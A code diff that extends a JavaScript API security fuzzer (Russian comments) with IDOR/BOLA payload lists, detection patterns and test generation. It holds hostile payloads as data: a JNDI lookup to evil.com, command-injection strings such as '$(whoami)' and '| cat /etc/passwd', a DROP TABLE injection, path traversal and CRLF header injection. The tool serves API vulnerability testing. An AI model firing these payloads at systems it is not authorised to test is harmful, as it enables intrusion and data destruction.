@@ -1,4 +1,4 @@
-// super_fuzzer_refactored.js - ПОЛНАЯ ВЕРСИЯ (ВСЕ PAYLOADS СОХРАНЕНЫ)
+// addons/fuzz/fuzz.js
 import axios from 'axios';
 import fs from 'fs';
 import path from 'path';
@@ -6,7 +6,7 @@ import { fileURLToPath } from 'url';
 import { faker } from '@faker-js/faker';
 import yaml from 'js-yaml';
 import { randomUUID } from 'crypto';
-import StructureMutator from './structureMutator.js';
+import StructureMutator from './modules/structureMutator.js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -199,6 +199,40 @@ const PAYLOADS = {
       '🔥'.repeat(3000), 'A'.repeat(10000) + '../'.repeat(1000)
     ],
     numbers: ['999999999999999999999', '-1', '0', '1e309', 'NaN', 'Infinity']
+  },
+  // ============================================================
+  // ДОБАВЛЯЕМ IDOR / BOLA ПЕЙЛОАДЫ
+  // ============================================================
+  idor: {
+    numeric: [
+      '1', '2', '3', '4', '5', '10', '100', '999', '1000',
+      '0001', '00001', '000001',
+      '9999999999', '99999999999',
+      '-1', '0', '1e9', '1e10',
+      'null', 'undefined', 'NaN', 'Infinity'
+    ],
+    string: [
+      'admin', 'root', 'test', 'user', 'guest', 'administrator',
+      'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
+      '00000000-0000-0000-0000-000000000000',
+      'ffffffff-ffff-ffff-ffff-ffffffffffff'
+    ],
+    email: [
+      'admin@example.com', 'user@example.com', 'test@example.com',
+      'root@localhost', 'admin@admin.com'
+    ],
+    username: [
+      'admin', 'root', 'test', 'user', 'guest',
+      'administrator', 'superuser', 'system'
+    ],
+    path: [
+      '../admin', '../root', '../../etc/passwd',
+      '%2e%2e%2fadmin', '%2e%2e%2froot'
+    ],
+    sql: [
+      "' OR 1=1--", "' OR '1'='1",
+      "1' OR '1'='1", "1' OR 1=1--"
+    ]
   }
 };
 
@@ -211,6 +245,7 @@ class VulnerabilityDetector {
 
   initPatterns() {
     return {
+      // ... все существующие паттерны ...
       sql: [
         { pattern: /SQL syntax.*MySQL/i, severity: 'critical', type: 'MySQL SQL Injection' },
         { pattern: /You have an error in your SQL syntax/i, severity: 'critical', type: 'SQL Injection' },
@@ -324,10 +359,31 @@ class VulnerabilityDetector {
       soap: [
         { pattern: /soap:Envelope/i, severity: 'low', type: 'SOAP Response' },
         { pattern: /faultcode/i, severity: 'medium', type: 'SOAP Fault' }
+      ],
+      // ============================================================
+      // ДОБАВЛЯЕМ IDOR / BOLA ДЕТЕКЦИЮ
+      // ============================================================
+      idor: [
+        { pattern: /"user_id":\s*\d+/i, severity: 'high', type: 'IDOR - User ID Disclosure' },
+        { pattern: /"userId":\s*\d+/i, severity: 'high', type: 'IDOR - User ID Disclosure' },
+        { pattern: /"id":\s*\d+/i, severity: 'medium', type: 'IDOR - ID Disclosure' },
+        { pattern: /"email":\s*"[^"]+@[^"]+"/i, severity: 'medium', type: 'BOLA - Email Disclosure' },
+        { pattern: /"username":\s*"[^"]+"/i, severity: 'medium', type: 'BOLA - Username Disclosure' },
+        { pattern: /"role":\s*"admin"/i, severity: 'critical', type: 'BOLA - Admin Role Disclosure' },
+        { pattern: /"isAdmin":\s*true/i, severity: 'critical', type: 'BOLA - Admin Flag Disclosure' },
+        { pattern: /"user":\s*{[^}]*"id":\s*\d+/i, severity: 'high', type: 'IDOR - User Data Access' },
+        { pattern: /"profile":\s*{[^}]*"id":\s*\d+/i, severity: 'high', type: 'IDOR - Profile Data Access' },
+        { pattern: /"account":\s*{[^}]*"id":\s*\d+/i, severity: 'high', type: 'IDOR - Account Data Access' },
+        { pattern: /"post":\s*{[^}]*"userId":\s*\d+/i, severity: 'high', type: 'BOLA - Post Access' },
+        { pattern: /"order":\s*{[^}]*"userId":\s*\d+/i, severity: 'high', type: 'BOLA - Order Access' },
+        { pattern: /"document":\s*{[^}]*"userId":\s*\d+/i, severity: 'high', type: 'BOLA - Document Access' },
+        { pattern: /"users":\s*\[[^\]]*"id":\s*\d+[^\]]*\]/i, severity: 'medium', type: 'BOLA - User List Leak' },
+        { pattern: /"items":\s*\[[^\]]*"id":\s*\d+[^\]]*\]/i, severity: 'medium', type: 'BOLA - Item List Leak' }
       ]
     };
   }
 
+  // ... detect и resetDetections без изменений ...
   detect(response, testCase) {
     const vulnerabilities = [];
     const responseText = typeof response?.data === 'string' ? response.data : JSON.stringify(response?.data || '');
@@ -351,7 +407,6 @@ class VulnerabilityDetector {
     
     // Детекция уязвимостей в заголовках
     if (testCase.type === 'header_mutation' && testCase.headers) {
-      // Проверка на успешную CRLF инъекцию
       if (responseText.includes('X-Injected') || 
           responseText.includes('Set-Cookie') ||
           headers['User-Agent']?.includes('\r\n') && responseText.includes('X-Injected')) {
@@ -371,7 +426,6 @@ class VulnerabilityDetector {
         }
       }
       
-      // Проверка на большие заголовки (DoS)
       for (const [key, value] of Object.entries(testCase.headers)) {
         if (typeof value === 'string' && value.length > 10000) {
           const largeKey = `header_large_${endpointKey}`;
@@ -392,7 +446,6 @@ class VulnerabilityDetector {
         }
       }
       
-      // Проверка на неожиданные типы в заголовках
       for (const [key, value] of Object.entries(testCase.headers)) {
         if (value === null || value === undefined || typeof value === 'object') {
           const typeKey = `header_type_${endpointKey}`;
@@ -413,7 +466,6 @@ class VulnerabilityDetector {
         }
       }
       
-      // Проверка на 500 ошибку (краш от заголовков)
       if (status === 500) {
         const crashKey = `header_crash_${endpointKey}`;
         if (!this.foundVulnerabilities.has(crashKey)) {
@@ -462,7 +514,6 @@ class VulnerabilityDetector {
     this.foundVulnerabilities.clear();
   }
 }
-
 
 // ==================== ОСНОВНОЙ КЛАСС ФАЗЗЕРА ====================
 class APIFuzzer {
@@ -626,34 +677,13 @@ class APIFuzzer {
     
     const maliciousValues = {
       injection: [
-        "' OR 1=1--",
-        "<script>alert(1)</script>",
-        "../../../etc/passwd",
-        "${jndi:ldap://evil.com/a}",
-        "test\r\nX-Injected: malicious",
-        "test%0d%0aX-Injected:%20malicious",
-        "'; DROP TABLE users; --",
-        "`id`",
-        "$(whoami)",
-        "| cat /etc/passwd"
+        "' OR 1=1--", "<script>alert(1)</script>", "../../../etc/passwd",
+        "${jndi:ldap://evil.com/a}", "test\r\nX-Injected: malicious",
+        "test%0d%0aX-Injected:%20malicious", "'; DROP TABLE users; --",
+        "`id`", "$(whoami)", "| cat /etc/passwd"
       ],
-      large: [
-        'A'.repeat(5000),
-        'B'.repeat(10000),
-        'X'.repeat(20000),
-        '🔥'.repeat(3000)
-      ],
-      extreme: [
-        null,
-        undefined,
-        123456789,
-        true,
-        false,
-        {},
-        [],
-        '',
-        '💥⚡🔥💀'
-      ]
+      large: ['A'.repeat(5000), 'B'.repeat(10000), 'X'.repeat(20000), '🔥'.repeat(3000)],
+      extreme: [null, undefined, 123456789, true, false, {}, [], '', '💥⚡🔥💀']
     };
     
     const headersToMutate = [
@@ -666,10 +696,7 @@ class APIFuzzer {
       for (const payload of maliciousValues.injection.slice(0, 3)) {
         const mutatedHeaders = { ...baseHeaders };
         mutatedHeaders[headerName] = payload;
-        variants.push({
-          type: `injection_${headerName}`,
-          headers: mutatedHeaders
-        });
+        variants.push({ type: `injection_${headerName}`, headers: mutatedHeaders });
       }
     }
     
@@ -677,10 +704,7 @@ class APIFuzzer {
       for (const payload of maliciousValues.large.slice(0, 2)) {
         const mutatedHeaders = { ...baseHeaders };
         mutatedHeaders[headerName] = payload;
-        variants.push({
-          type: `large_${headerName}`,
-          headers: mutatedHeaders
-        });
+        variants.push({ type: `large_${headerName}`, headers: mutatedHeaders });
       }
     }
     
@@ -688,26 +712,18 @@ class APIFuzzer {
       for (const payload of maliciousValues.extreme) {
         const mutatedHeaders = { ...baseHeaders };
         mutatedHeaders[headerName] = payload;
-        variants.push({
-          type: `extreme_${headerName}`,
-          headers: mutatedHeaders
-        });
+        variants.push({ type: `extreme_${headerName}`, headers: mutatedHeaders });
       }
     }
     
     const crlfPayloads = [
-      'test\r\nX-Injected: true',
-      'test%0d%0aX-Injected:%20true',
-      'test\r\nSet-Cookie: injected=1'
+      'test\r\nX-Injected: true', 'test%0d%0aX-Injected:%20true', 'test\r\nSet-Cookie: injected=1'
     ];
     for (const payload of crlfPayloads) {
       const mutatedHeaders = { ...baseHeaders };
       mutatedHeaders['User-Agent'] = payload;
       mutatedHeaders['X-CRLF-Test'] = payload;
-      variants.push({
-        type: 'crlf_injection',
-        headers: mutatedHeaders
-      });
+      variants.push({ type: 'crlf_injection', headers: mutatedHeaders });
     }
     
     const extraMaliciousHeaders = [
@@ -722,10 +738,7 @@ class APIFuzzer {
     
     for (const extraHeader of extraMaliciousHeaders) {
       const mutatedHeaders = { ...baseHeaders, ...extraHeader };
-      variants.push({
-        type: 'extra_malicious',
-        headers: mutatedHeaders
-      });
+      variants.push({ type: 'extra_malicious', headers: mutatedHeaders });
     }
     
     return variants.slice(0, 30);
@@ -738,58 +751,43 @@ class APIFuzzer {
     
     const injectionHeaders = this.mutator.mutateHeaders(baseHeaders, 'injection');
     tests.push({
-        id: `${method}_${pathUrl}_headers_injection`,
-        method,
-        url: finalUrl,
-        path: pathUrl,
-        type: 'header_mutation',
-        subType: 'injection',
-        queryParams: normalPayload.query,
-        headers: injectionHeaders,
-        body: normalPayload.body,
-        payload: { type: 'header_injection', mutated: injectionHeaders }
+      id: `${method}_${pathUrl}_headers_injection`,
+      method, url: finalUrl, path: pathUrl,
+      type: 'header_mutation', subType: 'injection',
+      queryParams: normalPayload.query, headers: injectionHeaders,
+      body: normalPayload.body,
+      payload: { type: 'header_injection', mutated: injectionHeaders }
     });
     
     const largeHeaders = this.mutator.mutateHeaders(baseHeaders, 'large');
     tests.push({
-        id: `${method}_${pathUrl}_headers_large`,
-        method,
-        url: finalUrl,
-        path: pathUrl,
-        type: 'header_mutation',
-        subType: 'large',
-        queryParams: normalPayload.query,
-        headers: largeHeaders,
-        body: normalPayload.body,
-        payload: { type: 'header_large', mutated: largeHeaders }
+      id: `${method}_${pathUrl}_headers_large`,
+      method, url: finalUrl, path: pathUrl,
+      type: 'header_mutation', subType: 'large',
+      queryParams: normalPayload.query, headers: largeHeaders,
+      body: normalPayload.body,
+      payload: { type: 'header_large', mutated: largeHeaders }
     });
     
     const extremeHeaders = this.mutator.mutateHeaders(baseHeaders, 'extreme');
     tests.push({
-        id: `${method}_${pathUrl}_headers_extreme`,
-        method,
-        url: finalUrl,
-        path: pathUrl,
-        type: 'header_mutation',
-        subType: 'extreme',
-        queryParams: normalPayload.query,
-        headers: extremeHeaders,
-        body: normalPayload.body,
-        payload: { type: 'header_extreme', mutated: extremeHeaders }
+      id: `${method}_${pathUrl}_headers_extreme`,
+      method, url: finalUrl, path: pathUrl,
+      type: 'header_mutation', subType: 'extreme',
+      queryParams: normalPayload.query, headers: extremeHeaders,
+      body: normalPayload.body,
+      payload: { type: 'header_extreme', mutated: extremeHeaders }
     });
     
     const extremeHeaders2 = this.mutator.generateExtremeHeaders();
     tests.push({
-        id: `${method}_${pathUrl}_headers_extreme2`,
-        method,
-        url: finalUrl,
-        path: pathUrl,
-        type: 'header_mutation',
-        subType: 'extreme2',
-        queryParams: normalPayload.query,
-        headers: { ...baseHeaders, ...extremeHeaders2 },
-        body: normalPayload.body,
-        payload: { type: 'header_extreme2', mutated: extremeHeaders2 }
+      id: `${method}_${pathUrl}_headers_extreme2`,
+      method, url: finalUrl, path: pathUrl,
+      type: 'header_mutation', subType: 'extreme2',
+      queryParams: normalPayload.query,
+      headers: { ...baseHeaders, ...extremeHeaders2 },
+      body: normalPayload.body,
+      payload: { type: 'header_extreme2', mutated: extremeHeaders2 }
     });
     
     return tests;
@@ -817,6 +815,126 @@ class APIFuzzer {
     return result;
   }
 
+  // ============================================================
+  // ГЕНЕРАЦИЯ IDOR/BOLA ТЕСТОВ
+  // ============================================================
+  generateIdorTests(method, pathUrl, fullUrl, operation, baseHeaders) {
+    const tests = [];
+    const normalPayload = this.generateNormalPayload(operation);
+    const finalUrl = this.interpolateUrl(fullUrl, normalPayload.path);
+    
+    // 1. Числовые ID
+    for (const id of PAYLOADS.idor.numeric.slice(0, 8)) {
+      const idorPayload = this.buildInjectionPayload(operation, id);
+      const idorUrl = this.interpolateUrl(fullUrl, idorPayload.path);
+      tests.push({
+        id: `${method}_${pathUrl}_idor_num_${id}`,
+        method, url: idorUrl, path: pathUrl,
+        type: 'idor', subType: 'numeric',
+        queryParams: idorPayload.query,
+        headers: { ...baseHeaders },
+        body: idorPayload.body,
+        payload: { type: 'idor', value: id }
+      });
+    }
+    
+    // 2. Строковые ID
+    for (const id of PAYLOADS.idor.string.slice(0, 5)) {
+      const idorPayload = this.buildInjectionPayload(operation, id);
+      const idorUrl = this.interpolateUrl(fullUrl, idorPayload.path);
+      tests.push({
+        id: `${method}_${pathUrl}_idor_str_${id.substring(0, 10)}`,
+        method, url: idorUrl, path: pathUrl,
+        type: 'idor', subType: 'string',
+        queryParams: idorPayload.query,
+        headers: { ...baseHeaders },
+        body: idorPayload.body,
+        payload: { type: 'idor', value: id }
+      });
+    }
+    
+    // 3. Email
+    for (const email of PAYLOADS.idor.email) {
+      const idorPayload = this.buildInjectionPayload(operation, email);
+      const idorUrl = this.interpolateUrl(fullUrl, idorPayload.path);
+      tests.push({
+        id: `${method}_${pathUrl}_idor_email_${email}`,
+        method, url: idorUrl, path: pathUrl,
+        type: 'idor', subType: 'email',
+        queryParams: idorPayload.query,
+        headers: { ...baseHeaders },
+        body: idorPayload.body,
+        payload: { type: 'idor', value: email }
+      });
+    }
+    
+    // 4. Username
+    for (const username of PAYLOADS.idor.username) {
+      const idorPayload = this.buildInjectionPayload(operation, username);
+      const idorUrl = this.interpolateUrl(fullUrl, idorPayload.path);
+      tests.push({
+        id: `${method}_${pathUrl}_idor_user_${username}`,
+        method, url: idorUrl, path: pathUrl,
+        type: 'idor', subType: 'username',
+        queryParams: idorPayload.query,
+        headers: { ...baseHeaders },
+        body: idorPayload.body,
+        payload: { type: 'idor', value: username }
+      });
+    }
+    
+    // 5. SQL injection для IDOR
+    for (const sql of PAYLOADS.idor.sql) {
+      const idorPayload = this.buildInjectionPayload(operation, sql);
+      const idorUrl = this.interpolateUrl(fullUrl, idorPayload.path);
+      tests.push({
+        id: `${method}_${pathUrl}_idor_sql_${sql.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
+        method, url: idorUrl, path: pathUrl,
+        type: 'idor', subType: 'sql',
+        queryParams: idorPayload.query,
+        headers: { ...baseHeaders },
+        body: idorPayload.body,
+        payload: { type: 'idor', value: sql }
+      });
+    }
+    
+    // 6. Path traversal для IDOR
+    for (const pathVal of PAYLOADS.idor.path) {
+      const idorPayload = this.buildInjectionPayload(operation, pathVal);
+      const idorUrl = this.interpolateUrl(fullUrl, idorPayload.path);
+      tests.push({
+        id: `${method}_${pathUrl}_idor_path_${pathVal.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
+        method, url: idorUrl, path: pathUrl,
+        type: 'idor', subType: 'path',
+        queryParams: idorPayload.query,
+        headers: { ...baseHeaders },
+        body: idorPayload.body,
+        payload: { type: 'idor', value: pathVal }
+      });
+    }
+    
+    // 7. Если есть query параметры - пробуем IDOR в них
+    if (normalPayload.query && Object.keys(normalPayload.query).length > 0) {
+      for (const [key] of Object.entries(normalPayload.query)) {
+        for (const id of PAYLOADS.idor.numeric.slice(0, 3)) {
+          const mutatedQuery = { ...normalPayload.query };
+          mutatedQuery[key] = id;
+          tests.push({
+            id: `${method}_${pathUrl}_idor_query_${key}_${id}`,
+            method, url: finalUrl, path: pathUrl,
+            type: 'idor', subType: 'query',
+            queryParams: mutatedQuery,
+            headers: { ...baseHeaders },
+            body: normalPayload.body,
+            payload: { type: 'idor', key: key, value: id }
+          });
+        }
+      }
+    }
+    
+    return tests;
+  }
+
   generateTestCases() {
     writeLog('info', 'Генерация тестов...');
     const testCases = [];
@@ -839,9 +957,7 @@ class APIFuzzer {
         // Нормальный тест
         testCases.push({
           id: `${method}_${pathUrl}_normal`,
-          method,
-          url: finalUrl,
-          path: pathUrl,
+          method, url: finalUrl, path: pathUrl,
           type: 'normal',
           queryParams: normalPayload.query,
           headers: { ...baseHeaders },
@@ -855,11 +971,8 @@ class APIFuzzer {
           const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
           testCases.push({
             id: `${method}_${pathUrl}_sql_${payload.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
-            method,
-            url: injectionUrl,
-            path: pathUrl,
-            type: 'injection',
-            category: 'sql',
+            method, url: injectionUrl, path: pathUrl,
+            type: 'injection', category: 'sql',
             queryParams: injectionPayload.query,
             headers: { ...baseHeaders },
             body: injectionPayload.body,
@@ -873,11 +986,8 @@ class APIFuzzer {
           const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
           testCases.push({
             id: `${method}_${pathUrl}_xss_${payload.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
-            method,
-            url: injectionUrl,
-            path: pathUrl,
-            type: 'injection',
-            category: 'xss',
+            method, url: injectionUrl, path: pathUrl,
+            type: 'injection', category: 'xss',
             queryParams: injectionPayload.query,
             headers: { ...baseHeaders },
             body: injectionPayload.body,
@@ -891,11 +1001,8 @@ class APIFuzzer {
           const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
           testCases.push({
             id: `${method}_${pathUrl}_cmd_${payload.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
-            method,
-            url: injectionUrl,
-            path: pathUrl,
-            type: 'injection',
-            category: 'command',
+            method, url: injectionUrl, path: pathUrl,
+            type: 'injection', category: 'command',
             queryParams: injectionPayload.query,
             headers: { ...baseHeaders },
             body: injectionPayload.body,
@@ -909,11 +1016,8 @@ class APIFuzzer {
           const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
           testCases.push({
             id: `${method}_${pathUrl}_path_${payload.substring(0, 10).replace(/[^a-zA-Z0-9]/g, '_')}`,
-            method,
-            url: injectionUrl,
-            path: pathUrl,
-            type: 'injection',
-            category: 'path',
+            method, url: injectionUrl, path: pathUrl,
+            type: 'injection', category: 'path',
             queryParams: injectionPayload.query,
             headers: { ...baseHeaders },
             body: injectionPayload.body,
@@ -927,11 +1031,8 @@ class APIFuzzer {
           const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
           testCases.push({
             id: `${method}_${pathUrl}_ssrf`,
-            method,
-            url: injectionUrl,
-            path: pathUrl,
-            type: 'injection',
-            category: 'ssrf',
+            method, url: injectionUrl, path: pathUrl,
+            type: 'injection', category: 'ssrf',
             queryParams: injectionPayload.query,
             headers: { ...baseHeaders },
             body: injectionPayload.body,
@@ -945,11 +1046,8 @@ class APIFuzzer {
           const injectionUrl = this.interpolateUrl(fullUrl, injectionPayload.path);
           testCases.push({
             id: `${method}_${pathUrl}_nosql`,
-            method,
-            url: injectionUrl,
-            path: pathUrl,
-            type: 'injection',
-            category: 'nosql',
+            method, url: injectionUrl, path: pathUrl,
+            type: 'injection', category: 'nosql',
             queryParams: injectionPayload.query,
             headers: { ...baseHeaders },
             body: injectionPayload.body,
@@ -961,9 +1059,7 @@ class APIFuzzer {
         for (const payload of PAYLOADS.xxe) {
           testCases.push({
             id: `${method}_${pathUrl}_xxe`,
-            method,
-            url: finalUrl,
-            path: pathUrl,
+            method, url: finalUrl, path: pathUrl,
             type: 'xxe',
             headers: { ...baseHeaders, 'Content-Type': 'application/xml' },
             body: payload,
@@ -975,9 +1071,7 @@ class APIFuzzer {
         for (const payload of PAYLOADS.graphql) {
           testCases.push({
             id: `${method}_${pathUrl}_graphql`,
-            method,
-            url: finalUrl,
-            path: pathUrl,
+            method, url: finalUrl, path: pathUrl,
             type: 'graphql',
             headers: { ...baseHeaders },
             body: { query: payload },
@@ -989,9 +1083,7 @@ class APIFuzzer {
         for (const payload of PAYLOADS.soap) {
           testCases.push({
             id: `${method}_${pathUrl}_soap`,
-            method,
-            url: finalUrl,
-            path: pathUrl,
+            method, url: finalUrl, path: pathUrl,
             type: 'soap',
             headers: { ...baseHeaders, 'Content-Type': 'application/soap+xml' },
             body: payload,
@@ -1003,9 +1095,7 @@ class APIFuzzer {
         for (const headerPayload of PAYLOADS.header.crlf) {
           testCases.push({
             id: `${method}_${pathUrl}_header`,
-            method,
-            url: finalUrl,
-            path: pathUrl,
+            method, url: finalUrl, path: pathUrl,
             type: 'header_injection',
             queryParams: normalPayload.query,
             headers: { ...baseHeaders, 'User-Agent': headerPayload, 'X-Test-Header': headerPayload },
@@ -1019,11 +1109,8 @@ class APIFuzzer {
         for (const headerVariant of headerMutationVariants) {
           testCases.push({
             id: `${method}_${pathUrl}_headers_${headerVariant.type}`,
-            method,
-            url: finalUrl,
-            path: pathUrl,
-            type: 'header_mutation',
-            subType: headerVariant.type,
+            method, url: finalUrl, path: pathUrl,
+            type: 'header_mutation', subType: headerVariant.type,
             queryParams: normalPayload.query,
             headers: headerVariant.headers,
             body: normalPayload.body,
@@ -1037,9 +1124,7 @@ class APIFuzzer {
           const largeUrl = this.interpolateUrl(fullUrl, largePayload.path);
           testCases.push({
             id: `${method}_${pathUrl}_large`,
-            method,
-            url: largeUrl,
-            path: pathUrl,
+            method, url: largeUrl, path: pathUrl,
             type: 'large_payload',
             queryParams: largePayload.query,
             headers: { ...baseHeaders },
@@ -1054,11 +1139,8 @@ class APIFuzzer {
           this.mutator.recursiveInject(mutatedBody, 'injection');
           testCases.push({
             id: `${method}_${pathUrl}_mutation_body_injection`,
-            method,
-            url: finalUrl,
-            path: pathUrl,
-            type: 'mutation',
-            subType: 'body_injection',
+            method, url: finalUrl, path: pathUrl,
+            type: 'mutation', subType: 'body_injection',
             queryParams: normalPayload.query,
             headers: { ...baseHeaders },
             body: mutatedBody,
@@ -1069,11 +1151,8 @@ class APIFuzzer {
           this.mutator.recursiveInject(largeBody, 'large');
           testCases.push({
             id: `${method}_${pathUrl}_mutation_body_large`,
-            method,
-            url: finalUrl,
-            path: pathUrl,
-            type: 'mutation',
-            subType: 'body_large',
+            method, url: finalUrl, path: pathUrl,
+            type: 'mutation', subType: 'body_large',
             queryParams: normalPayload.query,
             headers: { ...baseHeaders },
             body: largeBody,
@@ -1087,11 +1166,8 @@ class APIFuzzer {
               if (mutated) {
                 testCases.push({
                   id: `${method}_${pathUrl}_extreme_mutation_body_${i}`,
-                  method,
-                  url: finalUrl,
-                  path: pathUrl,
-                  type: 'extreme_mutation',
-                  subType: 'body',
+                  method, url: finalUrl, path: pathUrl,
+                  type: 'extreme_mutation', subType: 'body',
                   queryParams: normalPayload.query,
                   headers: { ...baseHeaders },
                   body: mutated,
@@ -1110,11 +1186,8 @@ class APIFuzzer {
           this.mutator.recursiveInject(mutatedQuery, 'injection');
           testCases.push({
             id: `${method}_${pathUrl}_mutation_query_injection`,
-            method,
-            url: finalUrl,
-            path: pathUrl,
-            type: 'mutation',
-            subType: 'query_injection',
+            method, url: finalUrl, path: pathUrl,
+            type: 'mutation', subType: 'query_injection',
             queryParams: mutatedQuery,
             headers: { ...baseHeaders },
             body: normalPayload.body,
@@ -1125,11 +1198,8 @@ class APIFuzzer {
           this.mutator.recursiveInject(largeQuery, 'large');
           testCases.push({
             id: `${method}_${pathUrl}_mutation_query_large`,
-            method,
-            url: finalUrl,
-            path: pathUrl,
-            type: 'mutation',
-            subType: 'query_large',
+            method, url: finalUrl, path: pathUrl,
+            type: 'mutation', subType: 'query_large',
             queryParams: largeQuery,
             headers: { ...baseHeaders },
             body: normalPayload.body,
@@ -1144,11 +1214,8 @@ class APIFuzzer {
           const mutatedPathUrl = this.interpolateUrl(fullUrl, mutatedPath);
           testCases.push({
             id: `${method}_${pathUrl}_mutation_path_injection`,
-            method,
-            url: mutatedPathUrl,
-            path: pathUrl,
-            type: 'mutation',
-            subType: 'path_injection',
+            method, url: mutatedPathUrl, path: pathUrl,
+            type: 'mutation', subType: 'path_injection',
             queryParams: normalPayload.query,
             headers: { ...baseHeaders },
             body: normalPayload.body,
@@ -1160,11 +1227,8 @@ class APIFuzzer {
           const largePathUrl = this.interpolateUrl(fullUrl, largePath);
           testCases.push({
             id: `${method}_${pathUrl}_mutation_path_large`,
-            method,
-            url: largePathUrl,
-            path: pathUrl,
-            type: 'mutation',
-            subType: 'path_large',
+            method, url: largePathUrl, path: pathUrl,
+            type: 'mutation', subType: 'path_large',
             queryParams: normalPayload.query,
             headers: { ...baseHeaders },
             body: normalPayload.body,
@@ -1184,11 +1248,8 @@ class APIFuzzer {
           this.mutator.recursiveInject(mutatedTestBody, 'injection');
           testCases.push({
             id: `${method}_${pathUrl}_mutation_test_body`,
-            method,
-            url: finalUrl,
-            path: pathUrl,
-            type: 'mutation',
-            subType: 'test_body',
+            method, url: finalUrl, path: pathUrl,
+            type: 'mutation', subType: 'test_body',
             queryParams: null,
             headers: { ...baseHeaders },
             body: mutatedTestBody,
@@ -1202,11 +1263,8 @@ class APIFuzzer {
               if (mutated) {
                 testCases.push({
                   id: `${method}_${pathUrl}_extreme_mutation_test_${i}`,
-                  method,
-                  url: finalUrl,
-                  path: pathUrl,
-                  type: 'extreme_mutation',
-                  subType: 'test',
+                  method, url: finalUrl, path: pathUrl,
+                  type: 'extreme_mutation', subType: 'test',
                   queryParams: null,
                   headers: { ...baseHeaders },
                   body: mutated,
@@ -1218,6 +1276,12 @@ class APIFuzzer {
             }
           }
         }
+        
+        // ============================================================
+        // ДОБАВЛЯЕМ IDOR/BOLA ТЕСТЫ
+        // ============================================================
+        const idorTests = this.generateIdorTests(method, pathUrl, fullUrl, operation, baseHeaders);
+        testCases.push(...idorTests);
       }
     }
 
@@ -1225,7 +1289,8 @@ class APIFuzzer {
     this.stats.total = testCases.length;
     
     const mutationCount = testCases.filter(t => t.type === 'mutation' || t.type === 'extreme_mutation').length;
-    writeLog('info', `Сгенерировано ${testCases.length} тестов (включая ${mutationCount} мутационных)`);
+    const idorCount = testCases.filter(t => t.type === 'idor').length;
+    writeLog('info', `Сгенерировано ${testCases.length} тестов (включая ${mutationCount} мутационных, ${idorCount} IDOR)`);
     
     return testCases;
   }
@@ -1343,7 +1408,8 @@ class APIFuzzer {
         duration_seconds: (Date.now() - this.startTime) / 1000,
         endpoints_tested: new Set(this.results.map(r => r?.path).filter(Boolean)).size,
         concurrency: this.concurrency,
-        mutation_tests: this.results.filter(r => r.type === 'mutation' || r.type === 'extreme_mutation').length
+        mutation_tests: this.results.filter(r => r.type === 'mutation' || r.type === 'extreme_mutation').length,
+        idor_tests: this.results.filter(r => r.type === 'idor').length
       },
       vulnerabilities_by_type: vulnStats,
       vulnerabilities: allVulnerabilities,
